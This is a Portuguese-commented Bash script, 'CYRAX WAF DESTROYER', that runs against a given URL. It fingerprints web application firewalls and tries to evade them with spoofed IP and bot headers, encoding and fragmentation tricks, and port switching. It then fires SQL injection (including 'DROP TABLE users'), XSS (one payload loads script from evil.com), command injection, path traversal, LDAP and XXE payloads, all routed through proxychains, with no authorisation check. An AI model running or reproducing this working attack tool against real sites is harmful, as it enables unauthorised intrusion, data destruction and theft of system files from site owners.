#!/bin/bash
# CYRAX WAF DESTROYER - Ferramenta definitiva anti-WAF
echo "=== CYRAX WAF DESTROYER - ULTIMATE WAF BYPASS ==="

TARGET="$1"
MODE="${2:-full}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <URL> [MODE]"
    echo "Modos: detect, bypass, exploit, full"
    echo "Exemplo: $0 https://site.com full"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/cyrax_waf_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/waf.log" ;;
        "BYPASS") echo "🔓 [$timestamp] $msg" | tee -a "$TEMP_DIR/waf.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/waf.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/waf.log" ;;
    esac
}

# Detectar WAF
detect_waf() {
    log "INFO" "Iniciando detecção de WAF"
    
    # Payloads para trigger WAF
    local waf_triggers=(
        "' OR '1'='1"
        "<script>alert(1)</script>"
        "../../etc/passwd"
        "UNION SELECT"
        "DROP TABLE"
        "<?php phpinfo(); ?>"
        "javascript:alert(1)"
        "../../../windows/system32"
        "' AND 1=1--"
        "<img src=x onerror=alert(1)>"
    )
    
    log "INFO" "Testando triggers de WAF"
    
    for trigger in "${waf_triggers[@]}"; do
        local encoded_trigger=$(echo "$trigger" | sed 's/ /%20/g')
        local test_url="$TARGET?test=$encoded_trigger"
        
        local response=$(proxychains4 -q curl -s -I "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        # Verificar headers de WAF conhecidos
        local waf_headers=$(echo "$response" | grep -iE "(cloudflare|incapsula|sucuri|akamai|barracuda|f5|imperva|fortinet|citrix|aws|azure)")
        
        if [ -n "$waf_headers" ]; then
            log "SUCCESS" "WAF detectado via headers: $waf_headers"
            echo "$waf_headers" >> "$TEMP_DIR/waf_detected.txt"
        fi
        
        # Verificar status codes típicos de WAF
        if [ "$status" = "403" ] || [ "$status" = "406" ] || [ "$status" = "429" ] || [ "$status" = "503" ]; then
            log "SUCCESS" "Possível WAF detectado: HTTP $status para payload '$trigger'"
            echo "STATUS_$status:$trigger" >> "$TEMP_DIR/waf_triggers.txt"
        fi
        
        sleep 1
    done
    
    # Detectar WAF por conteúdo da resposta
    local waf_content_signatures=(
        "cloudflare"
        "incapsula"
        "sucuri"
        "access denied"
        "blocked"
        "security policy"
        "web application firewall"
        "request blocked"
        "suspicious activity"
        "rate limit"
    )
    
    log "INFO" "Verificando assinaturas de conteúdo WAF"
    
    local content=$(proxychains4 -q curl -s "$TARGET?test=<script>" --connect-timeout 15 2>/dev/null)
    
    for signature in "${waf_content_signatures[@]}"; do
        if echo "$content" | grep -qi "$signature"; then
            log "SUCCESS" "WAF detectado por conteúdo: $signature"
            echo "CONTENT:$signature" >> "$TEMP_DIR/waf_detected.txt"
        fi
    done
}

# Bypass de WAF por headers
bypass_headers() {
    log "INFO" "Iniciando bypass por headers"
    
    # Headers de bypass
    local bypass_headers=(
        # IP Spoofing
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Cluster-Client-IP: 127.0.0.1"
        
        # CloudFlare bypass
        "CF-Connecting-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "X-Forwarded-Proto: https"
        "CF-IPCountry: US"
        "CF-RAY: 123456789-DFW"
        
        # AWS bypass
        "X-Forwarded-For: 127.0.0.1, 127.0.0.1"
        "X-AWS-ALB-Target-Group-Arn: arn:aws:elasticloadbalancing"
        
        # Akamai bypass
        "Akamai-Origin-Hop: 1"
        "True-Client-IP: 127.0.0.1"
        
        # User-Agent bypass (bots legítimos)
        "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "User-Agent: facebookexternalhit/1.1"
        "User-Agent: Twitterbot/1.0"
        "User-Agent: LinkedInBot/1.0"
        
        # Referer bypass
        "Referer: https://www.google.com/"
        "Referer: https://www.facebook.com/"
        "Referer: https://t.co/"
        
        # Content-Type bypass
        "Content-Type: application/json"
        "Content-Type: text/xml"
        "Content-Type: multipart/form-data"
        
        # Accept bypass
        "Accept: application/json, text/plain, */*"
        "Accept-Language: en-US,en;q=0.9"
        "Accept-Encoding: gzip, deflate, br"
        
        # Cache bypass
        "Cache-Control: no-cache"
        "Pragma: no-cache"
        
        # Custom bypass headers
        "X-Forwarded-Server: localhost"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "Forwarded: for=127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
    )
    
    # Payload de teste
    local test_payload="' OR '1'='1--"
    local test_url="$TARGET?test=$test_payload"
    
    log "INFO" "Testando $(( ${#bypass_headers[@]} )) headers de bypass"
    
    for header in "${bypass_headers[@]}"; do
        log "INFO" "Testando header: $header"
        
        local response=$(proxychains4 -q curl -s -I -H "$header" "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        # Verificar se o bypass funcionou (não bloqueado)
        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
            log "BYPASS" "Header bypass funcionou: $header -> HTTP $status"
            echo "HEADER_BYPASS:$header:$status" >> "$TEMP_DIR/successful_bypasses.txt"
            
            # Testar payload mais agressivo
            local aggressive_payload="<script>alert('CYRAX')</script>"
            local aggressive_url="$TARGET?xss=$aggressive_payload"
            
            local aggressive_response=$(proxychains4 -q curl -s -H "$header" "$aggressive_url" --connect-timeout 15 2>/dev/null)
            
            if echo "$aggressive_response" | grep -q "CYRAX"; then
                log "CRITICAL" "XSS bypass confirmado com header: $header"
                echo "XSS_BYPASS:$header" >> "$TEMP_DIR/critical_bypasses.txt"
            fi
        fi
        
        sleep 0.5
    done
}

# Bypass por encoding
bypass_encoding() {
    log "INFO" "Iniciando bypass por encoding"
    
    # Payload base
    local base_payload="' OR '1'='1--"
    
    # Técnicas de encoding
    local encoding_techniques=(
        # URL encoding
        "$(echo "$base_payload" | sed 's/ /%20/g; s/'\''/%27/g; s/=/%3D/g')"
        
        # Double URL encoding
        "$(echo "$base_payload" | sed 's/ /%2520/g; s/'\''/%2527/g; s/=/%253D/g')"
        
        # Unicode encoding
        "$(echo "$base_payload" | sed 's/'\''/%u0027/g; s/ /%u0020/g')"
        
        # HTML entity encoding
        "$(echo "$base_payload" | sed 's/'\''/%26%2339%3B/g; s/ /%26%2332%3B/g')"
        
        # Mixed case
        "' oR '1'='1--"
        "' Or '1'='1--"
        "' OR '1'='1--"
        
        # Null byte injection
        "${base_payload}%00"
        "${base_payload}%00.jpg"
        
        # Comment injection
        "' /**/OR/**/ '1'='1--"
        "' /*comment*/OR/*comment*/ '1'='1--"
        
        # Tab and newline
        "'%09OR%09'1'='1--"
        "'%0aOR%0a'1'='1--"
        "'%0dOR%0d'1'='1--"
        
        # Overlong UTF-8
        "$(echo "$base_payload" | sed 's/'\''/%c0%27/g')"
        "$(echo "$base_payload" | sed 's/'\''/%c1%81/g')"
        
        # Hex encoding
        "$(echo "$base_payload" | xxd -p | sed 's/../%&/g')"
        
        # Base64 encoding
        "$(echo "$base_payload" | base64)"
        
        # Case variations with encoding
        "'%4fR%20'1'%3d'1--"
        "'%6fr%20'1'%3D'1--"
    )
    
    log "INFO" "Testando $(( ${#encoding_techniques[@]} )) técnicas de encoding"
    
    for encoded_payload in "${encoding_techniques[@]}"; do
        local test_url="$TARGET?test=$encoded_payload"
        
        log "INFO" "Testando encoding: ${encoded_payload:0:50}..."
        
        local response=$(proxychains4 -q curl -s -I "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
            log "BYPASS" "Encoding bypass funcionou: $encoded_payload -> HTTP $status"
            echo "ENCODING_BYPASS:$encoded_payload:$status" >> "$TEMP_DIR/successful_bypasses.txt"
        fi
        
        sleep 0.5
    done
}

# Bypass por fragmentação
bypass_fragmentation() {
    log "INFO" "Iniciando bypass por fragmentação"
    
    # Técnicas de fragmentação
    local fragmentation_techniques=(
        # SQL Injection fragmentado
        "' UNION/**_**/SELECT"
        "' UNI/**/ON SE/**/LECT"
        "' UN/**/ION SEL/**/ECT"
        "'/**/UNION/**/SELECT/**/"
        "' UNION%0aSELECT"
        "' UNION%0dSELECT"
        "' UNION%09SELECT"
        
        # XSS fragmentado
        "<scr/**/ipt>alert(1)</scr/**/ipt>"
        "<scr%0aipt>alert(1)</scr%0aipt>"
        "<scr%0dipt>alert(1)</scr%0dipt>"
        "<scr%09ipt>alert(1)</scr%09ipt>"
        "<script/**/src=//evil.com></script>"
        
        # Command injection fragmentado
        ";/**/cat/**//etc/passwd"
        ";%0acat%0a/etc/passwd"
        ";%0dcat%0d/etc/passwd"
        ";%09cat%09/etc/passwd"
        
        # Path traversal fragmentado
        "..//**/../**//etc/passwd"
        "..%0a..%0a/etc/passwd"
        "..%0d..%0d/etc/passwd"
        "..%09..%09/etc/passwd"
    )
    
    log "INFO" "Testando $(( ${#fragmentation_techniques[@]} )) técnicas de fragmentação"
    
    for fragment in "${fragmentation_techniques[@]}"; do
        local test_url="$TARGET?payload=$fragment"
        
        log "INFO" "Testando fragmentação: ${fragment:0:50}..."
        
        local response=$(proxychains4 -q curl -s "$test_url" --connect-timeout 15 2>/dev/null)
        local status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$test_url" --connect-timeout 10 2>/dev/null)
        
        # Verificar se não foi bloqueado e se há indicadores de sucesso
        if [ "$status" = "200" ]; then
            if echo "$response" | grep -qi "root:\|syntax error\|mysql\|alert\|script"; then
                log "CRITICAL" "Fragmentação bypass com execução: $fragment"
                echo "FRAGMENT_EXECUTION:$fragment" >> "$TEMP_DIR/critical_bypasses.txt"
            else
                log "BYPASS" "Fragmentação bypass funcionou: $fragment -> HTTP $status"
                echo "FRAGMENT_BYPASS:$fragment:$status" >> "$TEMP_DIR/successful_bypasses.txt"
            fi
        fi
        
        sleep 0.5
    done
}

# Bypass por protocolo
bypass_protocol() {
    log "INFO" "Iniciando bypass por protocolo"
    
    # Extrair domínio
    local domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1)
    local path=$(echo "$TARGET" | sed 's|^https\?://[^/]*||')
    
    # Variações de protocolo e porta
    local protocol_variations=(
        "http://$domain$path"
        "https://$domain$path"
        "http://$domain:80$path"
        "https://$domain:443$path"
        "http://$domain:8080$path"
        "https://$domain:8443$path"
        "http://$domain:3000$path"
        "http://$domain:8000$path"
    )
    
    # Payload de teste
    local test_payload="?test=' OR '1'='1--"
    
    log "INFO" "Testando variações de protocolo e porta"
    
    for variation in "${protocol_variations[@]}"; do
        local test_url="$variation$test_payload"
        
        log "INFO" "Testando: $variation"
        
        local response=$(proxychains4 -q curl -s -I "$test_url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ "$status" = "200" ] || [ "$status" = "301" ] || [ "$status" = "302" ]; then
            log "BYPASS" "Protocol bypass funcionou: $variation -> HTTP $status"
            echo "PROTOCOL_BYPASS:$variation:$status" >> "$TEMP_DIR/successful_bypasses.txt"
        fi
        
        sleep 1
    done
}

# Exploração com bypasses encontrados
exploit_with_bypasses() {
    log "INFO" "Iniciando exploração com bypasses encontrados"
    
    if [ ! -f "$TEMP_DIR/successful_bypasses.txt" ]; then
        log "INFO" "Nenhum bypass encontrado para exploração"
        return
    fi
    
    # Payloads de exploração
    local exploit_payloads=(
        # SQL Injection
        "' UNION SELECT user(),version(),database()--"
        "' UNION SELECT 1,2,3,4,5--"
        "'; DROP TABLE users--"
        
        # XSS
        "<script>alert('CYRAX_XSS')</script>"
        "<img src=x onerror=alert('CYRAX_XSS')>"
        "javascript:alert('CYRAX_XSS')"
        
        # Command Injection
        "; cat /etc/passwd"
        "| whoami"
        "&& id"
        
        # Path Traversal
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        
        # LDAP Injection
        "*)(uid=*))(|(uid=*"
        "*)(|(password=*))"
        
        # XXE
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
    )
    
    log "INFO" "Testando payloads de exploração com bypasses"
    
    while IFS=: read -r bypass_type bypass_method status; do
        log "INFO" "Usando bypass: $bypass_type - $bypass_method"
        
        for payload in "${exploit_payloads[@]}"; do
            case "$bypass_type" in
                "HEADER_BYPASS")
                    local test_url="$TARGET?exploit=$payload"
                    local response=$(proxychains4 -q curl -s -H "$bypass_method" "$test_url" --connect-timeout 15 2>/dev/null)
                    ;;
                "ENCODING_BYPASS")
                    local encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g')
                    local test_url="$TARGET?exploit=$encoded_payload"
                    local response=$(proxychains4 -q curl -s "$test_url" --connect-timeout 15 2>/dev/null)
                    ;;
                *)
                    local test_url="$TARGET?exploit=$payload"
                    local response=$(proxychains4 -q curl -s "$test_url" --connect-timeout 15 2>/dev/null)
                    ;;
            esac
            
            # Verificar indicadores de sucesso
            if echo "$response" | grep -qi "root:\|mysql\|version\|CYRAX_XSS\|uid=\|gid="; then
                log "CRITICAL" "EXPLORAÇÃO SUCESSO: $payload com bypass $bypass_type"
                echo "EXPLOIT_SUCCESS:$bypass_type:$payload" >> "$TEMP_DIR/successful_exploits.txt"
                echo "$response" > "$TEMP_DIR/exploit_response_$(date +%s).txt"
            fi
            
            sleep 1
        done
        
    done < "$TEMP_DIR/successful_bypasses.txt"
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/CYRAX_WAF_REPORT.md"
    
    cat > "$report_file" <<EOF
# CYRAX WAF DESTROYER - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Contar descobertas
    local waf_detected=0
    local bypasses_count=0
    local exploits_count=0
    
    [ -f "$TEMP_DIR/waf_detected.txt" ] && waf_detected=$(wc -l < "$TEMP_DIR/waf_detected.txt")
    [ -f "$TEMP_DIR/successful_bypasses.txt" ] && bypasses_count=$(wc -l < "$TEMP_DIR/successful_bypasses.txt")
    [ -f "$TEMP_DIR/successful_exploits.txt" ] && exploits_count=$(wc -l < "$TEMP_DIR/successful_exploits.txt")
    
    echo "- **WAF detectado:** $([ $waf_detected -gt 0 ] && echo "Sim" || echo "Não")" >> "$report_file"
    echo "- **Bypasses encontrados:** $bypasses_count" >> "$report_file"
    echo "- **Exploits bem-sucedidos:** $exploits_count" >> "$report_file"
    
    # Adicionar detalhes do WAF detectado
    if [ $waf_detected -gt 0 ]; then
        echo -e "\n## 🛡️ WAF DETECTADO" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/waf_detected.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    # Adicionar bypasses
    if [ $bypasses_count -gt 0 ]; then
        echo -e "\n## 🔓 BYPASSES BEM-SUCEDIDOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/successful_bypasses.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    # Adicionar exploits
    if [ $exploits_count -gt 0 ]; then
        echo -e "\n## 💥 EXPLOITS BEM-SUCEDIDOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/successful_exploits.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "🛡️  WAF detectado: $([ $waf_detected -gt 0 ] && echo "Sim ($waf_detected indicadores)" || echo "Não")"
    echo "🔓 Bypasses: $bypasses_count"
    echo "💥 Exploits: $exploits_count"
    
    if [ $bypasses_count -gt 0 ]; then
        echo -e "\n🔥 WAF BYPASSADO!"
    fi
    
    if [ $exploits_count -gt 0 ]; then
        echo -e "\n💀 EXPLORAÇÃO BEM-SUCEDIDA!"
    fi
}

# Execução principal baseada no modo
case "$MODE" in
    "detect")
        detect_waf
        ;;
    "bypass")
        detect_waf
        bypass_headers
        bypass_encoding
        bypass_fragmentation
        bypass_protocol
        ;;
    "exploit")
        detect_waf
        bypass_headers
        bypass_encoding
        bypass_fragmentation
        bypass_protocol
        exploit_with_bypasses
        ;;
    "full")
        detect_waf
        bypass_headers
        bypass_encoding
        bypass_fragmentation
        bypass_protocol
        exploit_with_bypasses
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ CYRAX WAF DESTROYER CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"